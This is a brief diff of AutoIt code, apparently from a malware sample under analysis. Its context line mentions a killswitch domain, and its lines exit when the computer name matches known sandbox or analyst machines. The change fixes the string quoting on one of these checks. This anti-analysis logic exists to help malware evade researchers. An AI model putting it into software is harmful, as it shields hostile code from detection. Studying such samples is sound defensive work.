@@ -5,7 +5,7 @@ $uFhyhtBkh = "rAiiQQZZDTHfMcSuylifDtsYazbc" ; unused also killswitch domain and 
 If (@ComputerName = "DESKTOP-QO5QU33") Then Exit
 If (@ComputerName = "NfZtFbPfH" ) Then Exit
 If (@ComputerName = "tz") Then Exit
-If (@ComputerName = ""ELICZ"") Then Exit
+If (@ComputerName = "ELICZ") Then Exit
 
 Func Get_Data_Struct($p1, $p2, $pop = 0 )
 	If Not $pop = 0 Then
